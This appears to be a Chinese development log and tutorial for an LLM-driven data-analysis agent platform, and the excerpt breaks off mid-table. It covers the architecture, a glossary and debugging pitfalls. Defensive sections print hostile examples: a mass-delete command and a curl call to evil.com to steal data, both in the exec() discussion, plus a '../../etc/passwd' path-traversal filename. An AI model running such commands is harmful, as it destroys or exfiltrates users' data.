## 第 1 章：项目到底是干什么的（通俗理解）

### 1.1 一句话说清楚

> 你上传一个 Excel 表格，说一句中文，系统自动给你生成图表和分析报告。

比如你上传了一份销售数据，输入"按地区统计销售额占比"，系统就会给你：

- 一张饼图（一眼看出哪个地区卖得最多）
- 一段分析结论（"华东地区销售额最高，占比 35%"）
- 决策记录（AI 是怎么得出这个结论的，每步都能看到）
- 可以下载成 HTML 报告或 JSON 数据

### 1.2 谁需要这个？

| 角色 | 使用场景 | 以前怎么做 | 现在怎么做 |
|------|---------|-----------|-----------|
| 销售主管小张 | 想知道"各产品线利润率对比" | 打开 Excel 写公式 → 做图表 → 写报告（30 分钟） | 上传文件 → 说一句话 → 等 3 秒 → 看到结果（10 秒） |
| 求职者小王 | 面 Agent 工程师岗位 | 只有理论知识，没有实际项目 | 现场演示这个 Agent 系统，面试官可以看架构图、评测数据、Trace 记录 |
| 学生小李 | 课程作业"数据分析系统" | 到处找代码拼凑 | 直接用这个完整项目，改改就能用 |

### 1.3 什么场景不适合？

| 不适合 | 原因 |
|--------|------|
| 企业级大数据（几百万行） | pandas 有内存限制，建议 < 10 万行 |
| 对公网上线服务 | 没有多用户、认证是 MVP 级别、安全还不够 |
| 需要复杂数据清洗流水线 | 只有基础的去重/填充缺失/删空行 |
| 需要多人同时编辑报表 | 每个请求独立，没有协作功能 |

### 1.4 这个项目不是什么？

- ❌ **不是 ChatGPT**——不是那种聊天机器人。它是专业做数据分析的，不能聊家常。
- ❌ **不是 Excel 插件**——它是一个独立的网页系统，不依赖 Excel。
- ❌ **不是 Power BI / Tableau**——不是重型商业智能工具。
- ✅ **是一个轻量级、开箱即用、面向业务用户的数据分析 Agent。**

### 1.5 面试时怎么介绍这个项目

> "这是一个自助式数据分析 Agent 平台。用户上传 CSV 或 Excel 文件，用自然语言描述分析需求，系统通过多轮 ReAct 推理、工具调用和字段白名单校验，自动生成可视化报表、分析结论和决策记录。即使没有配置 LLM Key，也能通过四层降级链路完成分析。"

## 第 2 章：全部专有名词总词典

> 按字母顺序排列。每个词第一次出现时用 **加粗** 标记。

### A

**Agent（智能体）**
能独立思考和行动的软件程序。给它一个目标，它能自己决定先做什么、再做什么。就像你雇了一个助理，你说"分析一下销售数据"，它自己会决定先看数据→再计算→最后出报告。

**API（Application Programming Interface，应用程序接口）**
两个程序之间沟通的约定方式。就像餐厅点餐——你告诉服务员你要什么（请求），服务员把菜端给你（响应）。这个项目里，前端通过 API 向后端发送请求、获取数据。

**API Key（API 密钥）**
调用某个 AI 服务（如 DeepSeek、OpenAI）的密码。你需要先申请一个 Key，每次调用 AI 时都带上它，服务商才知道谁在调用、扣谁的钱。

### C

**Chroma / Chromadb**
一个向量数据库。普通数据库根据"精确匹配"找东西（WHERE 姓名 = '张三'），向量数据库根据"意思相近"找东西。你说"销售额占比"，它能找到历史上跟这句话意思最接近的记录。

**CSV（Comma-Separated Values，逗号分隔值）**
最简单的表格文件格式。每行是一条数据，每列用逗号分开。可以用记事本打开，也可以用 Excel 打开。缺点是只能存纯文本，不能存公式和格式。

### D

**DataFrame（数据框）**
Python 里处理表格数据的方式。可以想象成"内存里的 Excel 表格"——有行有列，可以做各种计算（求和、平均、分组等）。这个项目用 pandas 库来处理 DataFrame。

**DeepSeek**
中国 AI 公司，提供大语言模型服务。比 OpenAI 便宜很多（约 1/10 的价格），中文能力也很好。这个项目默认配置使用 DeepSeek。

### E

**ECharts**
开源图表库（百度开发）。支持柱状图、折线图、饼图、散点图、热力图、雷达图等几十种图表。这个项目用它来渲染所有图表。

**Embedding（向量化）**
把文字变成一串数字的过程。比如"苹果" → [0.12, 0.34, -0.56]，"香蕉" → [0.15, 0.30, -0.50]。变成数字后，就可以计算两段文字的"意思距离"。

**Error Boundary（错误边界）**
React 的特性。当页面某个组件崩溃时，Error Boundary 能"兜住"这个错误，显示一个友好的提示页面（"页面渲染异常，请刷新"），而不是整个页面白屏。

### F

**FastAPI**
Python 的 Web 框架。用来写后端 API。特点：性能好（基于 asyncio）、自带文档（访问 /docs 就能看到 API 列表）、有类型检查。

**Function Calling（函数调用）**
大语言模型（LLM）的一种能力。不是让 AI 直接输出文字，而是让 AI"选择一个函数并填入参数"。比如 AI 选择"聚合分析"函数，填入参数：X轴=地区、Y轴=销售额。这样 AI 的输出是结构化的，而不是一段自由文本。

### G

**Git**
版本控制工具。可以记录每次代码修改——改了什么、谁改的、什么时候改的。方便回退到任意历史版本。

**GitHub**
存放代码的网站。把代码推送到 GitHub 后，别人（比如面试官）可以看到你的代码，你也可以从任何电脑下载。

**Golden Set（黄金测试集）**
预先准备好的测试用例。每个用例包含：用户需求、数据画像、期望结果。用来评测 Agent 的效果好不好。目前有 36 条，覆盖 10 种图表类型。

### J

**JSON（JavaScript Object Notation）**
一种数据格式，长这样：`{"姓名": "张三", "年龄": 25}`。这个项目里，AI 的输出格式就是 JSON。前端和后端之间传输数据也用 JSON。

### L

**LLM（Large Language Model，大语言模型）**
大型语言模型。比如 ChatGPT、DeepSeek、通义千问。可以理解为一个"什么都知道、但需要你明确告诉它要做什么"的超级大脑。它不会主动思考，只会按你的指令做事。

**LocalStorage**
浏览器自带的小仓库。网页可以把数据存在里面，关闭浏览器再打开数据还在。这个项目用来存用户配的 API Key 和历史报表列表。

**Lucide React**
图标库。提供各种小图标（箭头、下载、星星、齿轮等），给网页界面增加视觉效果。

### M

**Mermaid**
一种"用文字画图"的方式。在 Markdown 文档里写一段代码，GitHub 会自动把它渲染成流程图。README 里的架构图就是用 Mermaid 画的。

**MIME（Multipurpose Internet Mail Extensions）**
文件格式的"身份证"。比如 `.csv` 的 MIME 是 `text/csv`，`.xlsx` 是 `application/vnd.openxmlformats-officedocument.spreadsheetml.sheet`。用来校验上传的文件是不是真的 CSV 或 Excel。

### P

**pandas**
Python 最著名的数据处理库。可以读取 CSV/Excel、做各种计算、分组聚合、数据清洗。这个项目的所有数据处理都靠它。

**Pydantic**
Python 库，用来定义数据的"形状"——叫什么名字、什么类型、是不是必须的。FastAPI 用来自动校验 API 请求和返回的数据格式。

### R

**React**
前端框架。用来构建用户界面。核心思想：把页面拆成"组件"，每个组件管理自己的状态。数据变了组件自动重新渲染，不需要手动操作 DOM。

**ReAct（Reason + Act，思考 + 行动）**
Agent 的工作模式。先思考（Reason）需要做什么，再行动（Act），看到行动结果后再次思考。这个项目的 Agent 就是 ReAct 模式——三轮思考→行动→观察。

### S

**SessionStorage**
浏览器的小仓库（比 localStorage 小）。页面关闭后数据就消失。这个项目用来临时传递报表数据（生成报表后跳转页面时用）。

**SQLite**
文件型数据库。不用装任何软件，数据存在一个文件里（`daa.db`）。适合个人项目和 demo。Python 自带支持。

**Supervisor（主管）**
多智能体架构里的"总管"角色。负责分配任务、协调各个 Agent 的工作。用户只跟 Supervisor 说话，Supervisor 安排具体谁去做。

### T

**Tailwind CSS**
CSS 框架。写网页样式时不用自定义 CSS 类名，直接用现成的：`rounded-xl`（大圆角）、`text-sm`（小号文字）、`flex`（弹性布局）。写出来的 HTML 很整齐。

**Token**
AI 处理文字的最小单位。1 个汉字 ≈ 1-2 个 token，1 个英文单词 ≈ 1 个 token。调用 AI API 的费用按 token 数量计算。这个项目的 Agent 单次分析约消耗 1500-2000 token。

**Trace（追踪）**
Agent 的决策记录。记录了每轮 AI 调用了什么工具、传了什么参数、花了多长时间、消耗了多少 token。用户可以在报表页的"决策记录" Tab 里查看。

### V

**Vite**
前端构建工具。开发时修改代码能立刻看到效果（热更新，不用手动刷新浏览器）。打包时能把代码压缩优化，减少加载时间。

**向量**
一串数字，比如 `[0.12, 0.45, -0.33, ...]`。把文字转成向量后，就能比较两段文字的"意思是否相近"。向量数据库专门做这个。

### W

**Web 框架**
帮助开发者快速搭建网站/API 的工具。提供了路由（用户访问不同地址时该做什么）、请求处理、数据序列化等通用功能。这个项目用的 FastAPI 就是 Web 框架。

**白名单（Whitelist）**
一个"允许列表"。不在列表里的东西都会被拒绝。这个项目里，AI 返回的字段名必须在"数据集的字段列表"里，否则不执行。

### 3.2 用户操作一次，系统做了什么？

> 以下是一个完整的操作流程，每个步骤都有具体解释。

**第 1 步：用户在浏览器打开网页**

用户输入 `http://localhost:5173`，看到数据管理页面。页面上有一个文件上传区域。

**第 2 步：用户上传文件**

用户点击上传，选择 `sales_2024.csv`。

后端收到文件后：
1. 检查后缀名是不是 `.csv` / `.xlsx` / `.xls` → 不是就拒绝
2. 检查文件大小是不是超过 50MB → 超过就拒绝
3. 保存文件到 `data/uploads/` 目录
4. 用 pandas 读取文件，变成 DataFrame（内存里的表格）
5. 调用数据画像功能，分析这个表格有多少行、哪些列、每列是什么类型
6. 把数据存到 SQLite 数据库
7. 返回一个 数据集ID + 文件名 + 数据画像 给前端

前端收到后显示："已加载数据集：sales_2024.csv（30 行）"

**第 3 步：用户输入需求**

用户点击"基于此数据集新建分析"，跳转到智能分析页面。
用户输入"按地区统计销售额占比"，点击"开始分析"。

前端先检查字段适配性：饼图需要 X 轴是分类字段 → 选择的"地区"是分类字段 → 通过。

然后发送请求到后端。

**第 4 步：Agent 开始推理**

这个步骤最重要，详细展开：

```
系统给 LLM 的提示词（System Prompt）：
"你是数据分析 Agent。你有以下工具可用：
1. 获取数据画像 — 读取数据集的字段信息和统计摘要
2. 聚合分析 — 按指定字段和聚合方式计算数据
3. 推荐图表 — 推荐合适的图表类型
4. 生成结论 — 生成分析结论

请按顺序调用工具，每次调用一个。"

用户需求："按地区统计销售额占比"
```

**第 1 轮：LLM 感知数据**

```
LLM 思考：用户要按地区统计销售额。我需要先看看这个数据有什么字段。
LLM 决定：调用「获取数据画像」工具

后端执行：
  返回 → 数据集共 30 行、6 列。
          字段列表：地区, 销售额, 月份, 订单数, 利润, 成本
          数值字段：销售额, 订单数, 利润, 成本
          分类字段：地区
          日期字段：月份
          数据质量评级：A - 优秀
```

**第 2 轮：LLM 分析计算**

```
LLM 思考：用户说"占比"，这应该用饼图。我需要按地区汇总销售额。
LLM 决定：调用「聚合分析」工具
  参数：X轴=地区, Y轴=销售额, 聚合方式=求和

后端执行（字段白名单校验通过）：
  → pandas 按地区分组，对销售额求和
  → head(20) 截断，最多返回 20 行
  → 返回：
    聚合方式：求和，返回 4 行
    华东: 52000.00, 华南: 38000.00, 华北: 28000.00, 西南: 19000.00
```

**第 3 轮：LLM 出图和写结论**

```
LLM 思考：数据是按地区分类、看占比→应该推荐饼图。
LLM 决定：调用「推荐图表」工具
  参数：图表类型=饼图, 理由="占比分布推荐饼图"

后端执行：
  返回 → 推荐图表：饼图，理由：占比分布推荐饼图

LLM 决定：调用「生成结论」工具
  参数：结论="从销售额占比来看，华东地区占比最高（37.6%），是主要销售区域..."

后端执行：
  返回 → 结论字符串
```

**第 5 步：返回结果**

后端整理所有结果，返回给前端：

```json
{
  "图表类型": "饼图",
  "图表配置": {
    "类型": "pie",
    "标题": "按地区统计销售额占比",
    "X轴": "地区",
    "Y轴": ["销售额"],
    "数据": [
      {"地区": "华东", "销售额": 52000},
      {"地区": "华南", "销售额": 38000}
    ]
  },
  "结论": "从销售额占比来看...",
  "Agent Trace": [
    {"轮次": 1, "步骤": "LLM推理", "工具名": "获取数据画像", "状态": "成功"},
    {"轮次": 2, "步骤": "LLM推理", "工具名": "聚合分析", "状态": "成功"},
    {"轮次": 3, "步骤": "LLM推理", "工具名": "推荐图表", "状态": "成功"}
  ],
  "意图来源": "规则",
  "导出数据": {"HTML": "...", "JSON": "..."}
}
```

**第 6 步：前端展示**

前端收到数据后，整页跳转到报表页面。
ECharts 渲染饼图，显示推荐依据、分析结论、决策记录。

用户往上可翻历史报表（◀ 1/3 ▶），左右切换看之前的结果。

### 3.3 最重要的设计：降级链路

如果 LLM 调用失败了怎么办？系统设计了 4 层降级：

```
第 1 层：LLM 正常调用 → 出结果 ✅
第 2 层：多智能体模式 → 3 个 Agent 协作（多加一个质量审查环节）
第 3 层：关键词规则匹配 → "占比"→饼图、"趋势"→折线图
第 4 层：默认自动推荐 → 根据字段类型推荐

第 1 层失败了就自动掉到第 2 层，再失败继续往下掉。
第 4 层保证永远有输出——即使没有配置任何 AI。
```

## 第 4 章：阶段 0 — 电脑安装必备软件【开发日志】

### 背景

要运行这个项目，电脑上需要装一些基础软件。这个阶段就是"准备好厨房"，把锅碗瓢盆都备好。

需要安装：
- Python（运行后端和 Agent）
- Node.js（运行前端）
- Git（代码版本控制）
- 一个代码编辑器（推荐 VSCode）

### 可选方向

**Python 版本选择**

| 版本 | 优点 | 缺点 | 结论 |
|------|------|------|------|
| Python 3.11 | 稳定、FastAPI 全兼容 | 不是最新 | ✅ 选中 |
| Python 3.13 | 最新版 | 部分包可能不兼容 | ❌ 兼容风险 |
| Python 3.9 | 很多旧系统在用 | 缺少新语法特性 | ❌ 太老 |

**Node.js 版本选择**

| 版本 | 优点 | 缺点 | 结论 |
|------|------|------|------|
| Node.js 18 LTS | 稳定、Vite 全兼容 | 不是最新 | ✅ 选中 |
| Node.js 22 | 最新 | 可能不兼容旧包 | ❌ |

### 为什么选这些

Python + Node.js 是目前 Web 全栈开发的标配。Python 负责后端数据处理，Node.js 负责前端构建。分开装是因为它们各自有独立生态（Python 有 pip 装包，Node.js 有 npm 装包）。

### 踩坑记录

**坑：Python 没有加到 PATH**

安装 Python 时有一个复选框"Add Python to PATH"，如果没勾选，在命令行输入 `python` 会报错"不是内部或外部命令"。

**解决**：重新安装，勾选"Add Python to PATH"。或者手动把 Python 安装路径加到系统环境变量。

### 非预期行为

**Windows 系统上 `python` 可能指向 Microsoft Store**

新版 Windows 在命令行输入 `python` 会弹出 Microsoft Store 页面，提示你安装 Python。这不是真正的 Python。

**解决**：从 python.org 官网下载安装，或者用 `py` 命令代替 `python`（Windows 的 Python launcher）。

node --version

10.5.0 ✅

### 面试可讲点

这个阶段没什么可讲的……面试不会问你怎么装软件的。但你可以顺带说"我的项目前端用 React + Vite + Tailwind，后端用 FastAPI + pandas，数据持久用 SQLite + Chroma"——这能体现你对技术栈的选择有意识。

## 第 5 章：阶段 1 — 创建项目文件夹骨架【开发日志】

### 背景

代码不能随便堆在一起。需要有清晰的目录结构，每个文件夹管自己的事。这一阶段就是建好文件夹，定好规则。

### 可选方向

**项目结构方案**

| 方案 | 优点 | 缺点 | 结论 |
|------|------|------|------|
| 按功能分层（api/、核心/、前端/） | 职责清晰，容易找代码 | 初期看起来文件夹多 | ✅ 选中 |
| 按业务模块（数据集/报表/Agent） | 业务聚合 | 共享逻辑不好放 | ❌ |
| 全放根目录 | 简单 | 后期混乱，没法维护 | ❌ |

**最终目录结构**

```
自助式数据分析Agent平台/
├── api/              # 后端 API 路由（FastAPI）
│   ├── main.py       # FastAPI 入口
│   ├── contracts.py  # 数据模型定义
│   ├── dependencies.py # 依赖注入（认证等）
│   └── routes/       # API 路由具体实现
├── 后端_核心/         # 业务核心
│   ├── agent/        # Agent 内核（编排器、工具、LLM）
│   ├── 存储/          # SQLite 持久化
│   └── 数据画像.py    # 字段分析
├── frontend/         # React 前端
│   └── src/
│       ├── pages/    # 页面组件
│       ├── components/ # 通用组件
│       └── api.js    # API 调用封装
├── config/           # 配置读取
├── data/             # 数据文件
├── docs/             # 文档和日志
├── scripts/          # 工具脚本
├── tests/            # 测试用例
└── 启动.ps1          # 一键启动脚本
```

### 为什么选这个结构

**前后端分离**：前端和后端是独立的项目，可以分别开发、分别部署。前端开发时不需要启动后端，后端开发时不需要启动前端。

**按职责分层**：`api/` 只做 API 路由（接收请求、返回响应），`后端_核心/` 做具体业务逻辑（数据分析、Agent 编排）。这样修改 API 时不会影响核心逻辑，修改核心逻辑时不会影响 API。

### 踩坑记录

**坑：`.env` 没有加到 `.gitignore`**

一开始创建项目时忘了建 `.gitignore`，`.env` 文件（含 API Key）被 Git 跟踪了。如果这时候 push 到 GitHub，所有人能看到你的 API Key。

**解决**：立刻创建 `.gitignore`，把 `.env`、`__pycache__/`、`node_modules/`、`data/uploads/` 等加入忽略列表。如果已经不小心 push 了，要立即删除 Git 历史中的敏感文件。

**坑：`requirements.txt` 漏了 chromadb**

在开发过程中装了 chromadb（向量数据库），但忘了加到 `requirements.txt`。后续用户 clone 项目后 `pip install -r requirements.txt` 
不会安装 chromadb，运行时报 `ModuleNotFoundError: No module named 'chromadb'`。

**解决**：每次安装新 Python 包后，立即执行 `pip freeze > requirements.txt` 更新依赖清单。

### 非预期行为

**中文文件夹名的兼容问题**

项目用了中文命名（`后端_核心/`、`前端/`、`项目开发日志.md`）。在 Windows 上运行正常，但在某些 Linux 系统或 Docker 环境中，中文路径可能导致奇怪的问题。

**实际处理**：当前项目为了面试展示用了中文名，确保核心功能稳定。如果后续需要国际化，应该改成英文名。

### 测试结果

```powershell
# 验证目录结构已创建
ls api/ 后端_核心/ frontend/ config/ data/ docs/ scripts/ tests/
全部存在 ✅

# 验证 .gitignore 已生效
git check-ignore .env
.env  ✅
```

### 面试可讲点

可以提到"项目一开始就设计为前后端分离架构，而不是混在一起开发"，这体现你有工程化意识。同时"用 .gitignore 保护 API Key 不上传到公开仓库"，体现你有安全意识。

## 第 6 章：阶段 2 — 后端开发【开发日志】

### 背景

用户上传一个 CSV 或 Excel 文件，后端需要：
1. 接收文件
2. 检查文件是否合法（格式、大小）
3. 读取文件内容为 DataFrame（表格）
4. 分析表格结构（字段名、字段类型、数据质量）
5. 保存文件，方便以后取用
6. 提供 API 让前端可以上传、查看、列表

### 可选方向

**Web 框架选择**

| 框架 | 性能 | 学习成本 | 自带文档 | 结论 |
|------|------|---------|---------|------|
| FastAPI | 高（异步） | 中 | ✅ 有 | ✅ 选中 |
| Flask | 中 | 低 | ❌ 无 | ❌ |
| Django | 中 | 高 | 有管理后台 | ❌ 太重 |

**数据库选择**

| 数据库 | 安装 | 性能 | 适用场景 | 结论 |
|--------|------|------|---------|------|
| SQLite | 无需安装 | 中 | 个人项目、Demo | ✅ 选中 |
| MySQL | 需安装配置 | 高 | 生产环境 | ❌ |
| PostgreSQL | 需安装配置 | 高 | 生产环境 | ❌ |

**文件存储方式**

| 方式 | 优点 | 缺点 | 结论 |
|------|------|------|------|
| 文件系统 + SQLite 元数据 | 简单直观 | 文件多时难管理 | ✅ 选中 |
| 全部存数据库 | 集中管理 | 大文件存取慢 | ❌ |
| 云存储（如 S3） | 可扩展 | 需要账号 | ❌ |

### 为什么选 FastAPI

**FastAPI 的优势**：
1. 性能好——基于 asyncio（异步 I/O），可以同时处理很多请求
2. 自带 API 文档——访问 `/docs` 就能看到所有 API 的说明，可以交互式测试
3. 类型安全——用 Pydantic 定义请求和响应的格式，参数类型不对会自动报错


**什么场景选 Flask**：如果项目很小（5 个 API 以内），Flask 更简单。但这个项目有十几个 API，FastAPI 的结构化优势更明显。

### 踩坑记录

**坑 1：文件路径穿越（安全漏洞）**

用户上传文件时，`file.filename` 可能包含路径信息。比如用户传了一个叫 `../../etc/passwd` 的文件名，拼接路径后文件会写到上传目录之外。

**发现**：代码审查时注意到 `stored_name = f"{dataset_id}_{file_name}"` 直接拼接了文件名。

**解决**：用 `Path(file.filename).name` 只取文件名最后一段，过滤掉所有路径信息。

```python
# 修复前
file_name = file.filename
stored_name = f"{dataset_id}_{file_name}"  # 可能包含 ../

# 修复后
safe_name = Path(file.filename or "upload").name
stored_name = f"{dataset_id}_{safe_name}"   # 只取文件名
```

**坑 2：文件大小没有限制**

用户可能上传一个 2GB 的文件，`file.read()` 会把整个文件读入内存，导致服务器内存溢出。

**发现**：测试时传了一个大文件，后端没有报错，但内存占用飙升。

**解决**：读取文件后检查长度，超过 50MB 返回 413 错误。

**坑 3：空文件**

用户可能上传一个空文件。pandas 读取空文件会报错。

**解决**：读取文件后先检查内容是否为空。

### 非预期行为

**1. 上传成功后前端不跳转**

后端返回了数据集 ID，但前端没有自动跳转到分析页面。因为上传只是完成了"存文件"，用户还需要点击"基于此数据集新建分析"才能进入分析页。

**结论**：这是设计决定——上传文件后用户可能需要先看数据画像，再决定怎么分析。不是 Bug。

**2. 数据画像字段类型推断不完美**

pandas 无法区分"分类"和"文本"字段。后端的 `_字段分组()` 使用唯一值数量 ≤ 行数 50% 的启发式规则判断。短文本字段（如只有几个值的描述）可能被错误归类为"分类"。

**结论**：大约 85% 的准确率，极端情况需要用户手动修正。这是可以接受的精度。

### 测试结果

```powershell

python -m compileall api config 后端_核心
全部通过 ✅

# pytest 测试
python -m pytest tests/ -v
33 passed in 0.72s ✅
```

### 面试可讲点

**"我怎么保证上传文件的安全性"**

> "上传文件时，我做了三层校验：第一，文件后缀必须是 .csv/.xlsx/.xls；第二，文件大小不能超过 50MB；第三，文件名用 Path(filename).name 过滤路径信息，防止路径穿越攻击。"

## 第 7 章：阶段 3 — 前端网页页面开发【开发日志】

### 背景

用户需要一个"看得见、点得动"的界面。后端开发完了（API 可以调），但普通用户不会用命令行或 Postman。需要一个像普通网站一样的交互界面。

### 可选方向

**前端框架选择**

| 框架 | 生态 | 开发体验 | 面试认可度 | 结论 |
|------|------|---------|-----------|------|
| React 19 + Vite | 最强 | ⭐⭐⭐⭐⭐ | 最高 | ✅ 选中 |
| Vue 3 + Vite | 好 | ⭐⭐⭐⭐ | 中 | ❌ |
| 原生 HTML + jQuery | 零依赖 | ⭐⭐ | 低 | ❌ |
| Streamlit | 极快原型 | ⭐⭐⭐ | 低 | ❌ |

**样式方案选择**

| 方案 | 优点 | 缺点 | 结论 |
|------|------|------|------|
| Tailwind CSS v4 | 原子化 CSS，一致性高，开发快 | 类名长 | ✅ 选中 |
| 手写 CSS | 灵活 | 样式膨胀快，命名混乱 | ❌ |
| Ant Design | 组件丰富，开箱即用 | 重、定制困难 | ❌ |

**图表库选择**

| 库 | 图表类型 | 包大小 | 结论 |
|----|---------|--------|------|
| ECharts | 11 种 | ~900KB | ✅ 选中 |
| Recharts | 8 种 | 轻量 | ❌ |
| Chart.js | 7 种 | 轻量 | ❌ |

**页面布局选择**

| 布局 | 优点 | 缺点 | 结论 |
|------|------|------|------|
| 左侧导航 + 右侧内容 | 空间利用率高，现代 SaaS 标配 | 需要路由 | ✅ 选中 |
| 三栏等宽 | 一屏全见 | 信息密度太高 | ❌ |
| 聊天式单栏 | 极简 | 功能入口深 | ❌ |

### 为什么选这些

**React 而不是 Vue**：React 的生态最大、面试认可度最高、组件库（如 ECharts 的 React 封装）最全。

**Tailwind 而不是手写 CSS**：Tailwind 用现成的类名（`rounded-xl`、`text-sm`、`flex`），你不用自己想 CSS 类名叫什么、不用在不同文件间切换。开发效率提高一倍。

**ECharts 而不是 Recharts**：后端支持 11 种图表类型，需要前端能全部渲染。ECharts 的图表类型最多。

### 踩坑记录

**坑 1：生成报表后白屏（最严重的 Bug）**

**现象**：用户点击"开始分析"后跳转到报表页面，页面白屏。控制台报错 `Failed to execute 'insertBefore' on 'Node'`。

**排查过程（共 4 轮）**：

第一轮猜测：ECharts 组件的问题。
- 实验：把 `echarts-for-react` 换成原生 echarts API
- 结果：❌ 仍然白屏

第二轮猜测：Report 页面的 loading 状态导致。
- 实验：从 Report 页移除 `loading` 引用
- 结果：❌ 仍然白屏

第三轮定位根因：
- 检查发现 AppContext 有全局 `loading` 状态
- Analysis 页的 `finally` 块调用 `setLoading(false)` 触发整个组件树重渲染
- Report 页同时正在挂载，DOM 发生冲突
- 结果：✅ 移除全局 loading 后不再白屏

第四轮加固：
- 增加 ErrorBoundary 兜底，即使还有报错也不白屏
- 增加 `setTimeout(() => navigate(), 16)` 延迟导航，避免同一批次更新冲突
- 最终改用 `window.location.href` 整页跳转 + sessionStorage 传递数据
- 结果：✅ 彻底稳定

**教训**：页面切换类的 DOM 冲突，不应该在子组件层面排查。应优先检查全局状态管理（Context/Redux）是否在路由切换时触发了不必要的树级重渲染。

**坑 2：上传数据后切换页面，数据消失**

**现象**：上传文件后，切换到智能分析页面再切回数据管理页面，数据不见了。

**原因**：DataManagement 页用 `const [dataset, setDataset] = useState(null)` 初始化。React 组件重新挂载时，`useState` 重新初始化为 `null`。

**修复**：组件挂载时从 AppContext 读取已有数据：

```jsx
// 修复前
const [dataset, setDataset] = useState(null);

// 修复后
const { dataset: globalDataset } = useApp();
const [dataset, setDataset] = useState(globalDataset);
```

**坑 3：`alert` 弹窗提示太粗暴**

一开始用 `alert('分析失败: ' + e.message)` 显示错误。弹窗阻塞操作、不区分错误类型、用户不知道该怎么办。

**修复**：改成页面内的错误提示条，区分网络错误（"后端服务不可用"）、认证错误（"认证配置不正确"）、文件太大（"超过 50MB 限制"）、其他错误（显示具体信息）。

### 非预期行为

**1. ECharts 包体积较大**

echarts 包体积约 900KB（压缩后约 305KB），导致前端首次加载较慢。对于 demo 项目来说可以接受。如果后续需要优化，可以考虑按需加载（只用哪些图表就加载哪些组件）。

**2. 雷达图 `indicator` 变量名 typo**

代码里写的是 `radar: { indicator, radius: '60%' }`，但变量名是 `indicators`（带 s）。运行时报"图表渲染异常"。这是代码审查时发现的，属于低级错误。

**3. Vite HMR 导致白屏**

开发模式下，Vite 的热更新（HMR）会在文件修改时自动推送更新到浏览器。如果 HMR 更新时用户正好在导航（Analysis → Report），React 的 reconciliation 会发生冲突，导致白屏。ErrorBoundary 兜住了，但体验不佳。生产模式（`npm run build` + 部署）下不会出现这个问题。

### 测试结果

```powershell

cd frontend
npm run build
✓ built ✅

# Playwright 自动化测试
上传 → 分析 → 报表，0 JS 错误 ✅
数据管理 → 智能分析 → 数据管理，数据保留 ✅
```

### 面试可讲点

**"白屏修复"的面试价值**：

> "修复白屏的过程本身就是面试素材——可以讲如何定位 React DOM reconciliation 冲突。从组件层排查到全局状态管理，逐层缩小范围，最终定位到 AppContext 的全局 loading 状态在页面切换时触发的树级重渲染。"

这段经历证明你有：系统化排查能力、全局状态管理意识、React 渲染机制理解。

## 第 8 章：阶段 4 — Agent 智能体核心开发【开发日志】

### 背景

在接入 AI 之前，系统的"智能"全靠关键词匹配——用户说"占比"就推荐饼图，"趋势"就推荐折线图。这种方式很脆弱，用户换个说法（"分布情况"）系统就不懂了。

需要让 AI 真正理解用户需求，而不是猜关键词。

### 可选方向

**核心路线选择**

| 方向 | 安全 | 面试可讲性 | 实现成本 | 结论 |
|------|------|-----------|---------|------|
| A. LLM + Function Calling + 关键词兜底 | ✅ 高 | ⭐⭐⭐⭐⭐ | 中（~250行） | ✅ 选中 |
| A2. LangGraph 9-pipe 全编排 | 中 | ⭐⭐⭐⭐ | 极高（~15h） | ❌ |
| B. 先做 SQLite 持久化 | 安全 | ⭐⭐ | 低 | ❌ |
| B3. 先写评测集 | 安全 | ⭐⭐⭐⭐ | 中 | ❌ |
| X. exec(LLM 代码)（用户原始方案） | ❌ 灾难性 | ⭐（无法解释安全） | 中 | ❌ 拒绝 |

**ReAct 轮数选择**

| 轮数 | 灵活度 | 可控性 | Token 消耗 | 结论 |
|------|--------|--------|-----------|------|
| 3 轮固定（画像→聚合→图表+结论） | 低 | 高 | 可预测 | ✅ 选中 |
| 动态轮数（直到 LLM 说完成） | 高 | 低 | 不可控 | ❌ 可能死循环 |
| 单轮（原方案） | 极低 | 高 | 最低 | ❌ 缺少闭环 |

**Tool Executor 实现方式**

| 方式 | 职责分离 | 复杂度 | 结论 |
|------|---------|--------|------|
| 单独执行器注册文件 | ✅ 清晰 | 低 | ✅ 选中 |
| 直接在工具集注册 | 耦合 | 更低 | ❌ 模块边界模糊 |
| 在报表生成器注册 | 靠近业务 | 高（循环导入） | ❌ |

### 为什么选 A（LLM + Function Calling）

面试官第一时间看"有没有真实 LLM 调用"——A 是必选项。

`exec(LLM 代码)` 是安全灾难。面试官会追问"这样的代码为什么不用 AST 白名单/沙箱？"——Function Calling 是正面回答。

### 为什么选 3 轮固定

3 轮是经过思考的选择：
- 第 1 轮感知数据（LLM 必须先知道数据长什么样）
- 第 2 轮计算数据（按用户需求做聚合）
- 第 3 轮出结果（推荐图表 + 写结论）

这个顺序是数据分析的自然思维流程。固定 3 轮而不是动态轮数，是因为动态轮数不可控——LLM 可能一直说"我再看一眼数据"，导致 token 费用无限增长。

### 为什么拒绝 X（exec）

LLM 生成 Python 代码然后 `exec()` 执行是"强大但危险"的路线：

```python
# LLM 可能生成的代码
df.groupby('地区').sum()  # 正常分析 ✅

# LLM 也可能生成的代码
import os
os.system('del /f /s /q C:\\*')  # 删除系统文件 ❌
os.system('curl http://evil.com/steal_data')  # 窃取数据 ❌
```

这个项目选择了更安全的方式：LLM 只能选 4 个预定义的工具并填参数，所有参数经过字段白名单校验后才能执行。

### 踩坑记录

**坑 1：循环导入**

编排器直接 import `_意图驱动配置`（在 `上传报表生成器.py` 里），但 `上传报表生成器.py` 又在顶部 import 编排器。Python 处理不了这种"你 import 我、我 import 你"的循环。

**发现**：运行时抛 ImportError。

**解决**：在函数内部 import（延迟 import），不在文件顶部 import。让编排器完全不知道降级函数的存在，降级逻辑由调用侧完成。

```python
# 修复前（文件顶部）
from 上传报表生成器 import _意图驱动配置

# 修复后（函数内部）
def 降级(画像, 需求):
    from 上传报表生成器 import _意图驱动配置
    return _意图驱动配置(画像, 需求)
```

**坑 2：测试陈旧导致 6 个测试失败**

阶段 1 的测试假设函数签名叫 `解析自然语言需求`，阶段 2 重构后签名变成 `编排Agent`。6 个测试全部失败。

**发现**：运行 `pytest` 时 6 个红色失败。

**解决**：把 mock 目标从 `chat_completion` 改为 mock `编排Agent` 本身。这样测试直接验证新的调用链路。

**坑 3：结论来源变量缺失 5 次**

在添加 `结论来源` 字段时，同一个变量写错了 5 次才补全：

| 次数 | 问题 | 报错 |
|------|------|------|
| 第 1 次 | 返回 tuple 到结论字段 | 前端解析崩溃 |
| 第 2 次 | 解包了但不把字段放入响应 | 响应中缺字段 |
| 第 3 次 | 引用未定义变量 | NameError |
